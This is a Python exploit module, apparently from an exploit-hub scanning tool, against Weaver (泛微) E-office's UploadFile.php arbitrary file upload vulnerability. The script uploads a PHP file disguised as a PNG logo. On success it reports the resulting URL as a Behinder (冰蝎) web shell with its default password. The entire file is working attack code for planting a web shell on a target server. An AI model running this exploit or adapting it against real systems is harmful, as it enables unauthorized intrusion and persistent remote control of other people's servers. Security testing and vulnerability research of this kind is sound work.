import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from lib.Urldeal import umethod
from lib import *
import logging
import urllib3


urllib3.disable_warnings()

def E_office_upload(Url):
    scheme, url, port = umethod(Url)
    urldata = scheme + "://" + url + ':' + str(port) + '/'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:94.0) Gecko/20100101 Firefox/94.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
    }
    upload_url = urldata + 'general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId='
    exp_url = urldata + 'images/logo/logo-eoffice.php'
    try:
        requests.packages.urllib3.disable_warnings()
        file = [('file1', ('index123.php', open('./exphub/fanwei/bin/index123.php', 'rb'), 'image/png'))]
        upload = requests.post(upload_url, headers=headers, files=file, verify=False)
        if upload.status_code == 200 and 'logo-eoffice.php' in upload.text:
            print(Vcolors.RED + "[!] 泛微OAUploadFile任意文件上传漏洞存在,冰蝎默认密码:{}".format(exp_url) + Vcolors.ENDC)
        else:
            print(Vcolors.WARNING + "[x] 不存在泛微OAUploadFile任意文件上传漏洞" + Vcolors.ENDC)

    except Exception as e:
        print(f"[0]  目标系统: {url} 存在未知错误！\n", e)
        logging.error("E_office_upload脚本出现异常")

  
        


